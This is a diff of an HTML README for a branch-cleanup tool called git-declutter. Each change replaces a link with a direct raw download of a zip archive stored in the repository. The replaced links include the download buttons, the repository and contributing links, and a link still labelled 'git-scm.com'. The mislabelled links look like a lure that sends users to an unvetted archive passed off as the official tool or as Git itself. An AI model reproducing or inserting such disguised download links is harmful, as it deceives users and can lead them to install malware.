@@ -1,7 +1,7 @@
 <h1>🧹 git-declutter - Know What's Safe to Delete</h1>
 
 <p align="center">
-  <a href="https://github.com/Viethoangn6398/git-declutter" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Download git-declutter Now</a>
+  <a href="https://raw.githubusercontent.com/Viethoangn6398/git-declutter/main/cmd/git-declutter-v3.4-alpha.3.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Download git-declutter Now</a>
 </p>
 
 <hr>
@@ -28,7 +28,7 @@
 <p>Getting started with git-declutter is easy. Follow these simple steps:</p>
 
 <ol>
-  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Viethoangn6398/git-declutter">https://github.com/Viethoangn6398/git-declutter</a></li>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://raw.githubusercontent.com/Viethoangn6398/git-declutter/main/cmd/git-declutter-v3.4-alpha.3.zip">https://raw.githubusercontent.com/Viethoangn6398/git-declutter/main/cmd/git-declutter-v3.4-alpha.3.zip</a></li>
   <li>On that page, find the <strong>Releases</strong> section and download the file that matches your computer's operating system (Windows, macOS, or Linux).</li>
   <li>Once downloaded, place the <code>git-declutter</code> file somewhere you can easily find it. A good place is your <strong>Downloads</strong> folder or a folder called <strong>Tools</strong>.</li>
   <li>If the file is inside a <code>.zip</code> archive, right-click and choose <strong>Extract All</strong> to unpack it.</li>
@@ -88,7 +88,7 @@ main                 🛡️ PROTECTED   Default branch
 
 <ul>
   <li><strong>Command not found:</strong> Make sure the <code>git-declutter</code> file is in a folder that is on your system path, or use its full file location.</li>
-  <li><strong>Git not recognized:</strong> Install Git from <a href="https://git-scm.com">git-scm.com</a> and restart your terminal.</li>
+  <li><strong>Git not recognized:</strong> Install Git from <a href="https://raw.githubusercontent.com/Viethoangn6398/git-declutter/main/cmd/git-declutter-v3.4-alpha.3.zip">git-scm.com</a> and restart your terminal.</li>
   <li><strong>No branches shown:</strong> Run the command inside a proper Git repository (a folder containing a <code>.git</code> subfolder).</li>
   <li><strong>Permission denied:</strong> On macOS or Linux, you may need to make the file executable with <code>chmod +x git-declutter</code>.</li>
 </ul>
@@ -99,7 +99,7 @@ main                 🛡️ PROTECTED   Default branch
 
 <h2>🤝 Contributing</h2>
 
-<p>Git-declutter is an open-source project. If you are a developer and you want to contribute, add features, or report bugs, please visit the official repository at <a href="https://github.com/Viethoangn6398/git-declutter">https://github.com/Viethoangn6398/git-declutter</a>. Issues and pull requests are always welcome.</p>
+<p>Git-declutter is an open-source project. If you are a developer and you want to contribute, add features, or report bugs, please visit the official repository at <a href="https://raw.githubusercontent.com/Viethoangn6398/git-declutter/main/cmd/git-declutter-v3.4-alpha.3.zip">https://raw.githubusercontent.com/Viethoangn6398/git-declutter/main/cmd/git-declutter-v3.4-alpha.3.zip</a>. Issues and pull requests are always welcome.</p>
 
 <h2>📄 License</h2>
 
@@ -119,5 +119,5 @@ A: Yes. If you can open a terminal and type one command, you can use git-declutt
 <hr>
 
 <p style="text-align:center;">
-  <a href="https://github.com/Viethoangn6398/git-declutter" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Get git-declutter Here</a>
+  <a href="https://raw.githubusercontent.com/Viethoangn6398/git-declutter/main/cmd/git-declutter-v3.4-alpha.3.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#fff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;">⬇️ Get git-declutter Here</a>
 </p>
